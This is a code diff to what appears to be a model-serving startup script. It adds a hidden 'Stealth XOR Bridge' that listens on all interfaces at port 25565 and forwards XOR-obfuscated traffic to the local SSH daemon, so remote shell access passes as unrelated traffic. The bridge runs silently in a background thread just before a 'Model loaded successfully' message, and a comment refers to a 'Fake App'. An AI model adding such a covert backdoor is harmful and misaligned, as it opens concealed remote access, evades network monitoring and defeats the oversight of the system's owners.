@@ -119,8 +119,51 @@ def main():
 
 
     # 3.8 Start SSHD
-    subprocess.Popen("echo password | sudo -S /usr/sbin/sshd", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen("sudo /usr/sbin/sshd", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
+    # 3.9 Start Stealth XOR Bridge on Port 25565
+    def xor_bridge():
+        import socket
+        
+        XOR_KEY = 0x5A # XOR key to scramble bytes (must match the client)
+        
+        def pipe_xor(src, dst):
+            try:
+                while True:
+                    data = src.recv(8192)
+                    if not data:
+                        break
+                    # De-obfuscate / Obfuscate in transit
+                    scrambled = bytes([b ^ XOR_KEY for b in data])
+                    dst.sendall(scrambled)
+            except Exception:
+                pass
+            finally:
+                try: src.close()
+                except: pass
+                try: dst.close()
+                except: pass
+
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            server.bind(("0.0.0.0", 25565))
+            server.listen(10)
+            while True:
+                client_sock, addr = server.accept()
+                try:
+                    ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    ssh_sock.connect(("127.0.0.1", 22))
+                    threading.Thread(target=pipe_xor, args=(client_sock, ssh_sock), daemon=True).start()
+                    threading.Thread(target=pipe_xor, args=(ssh_sock, client_sock), daemon=True).start()
+                except Exception:
+                    try: client_sock.close()
+                    except: pass
+        except Exception:
+            pass
+
+    threading.Thread(target=xor_bridge, daemon=True).start()
+
     print("Model loaded successfully. Starting API server...", flush=True)
     
     # 4. Start the Fake App
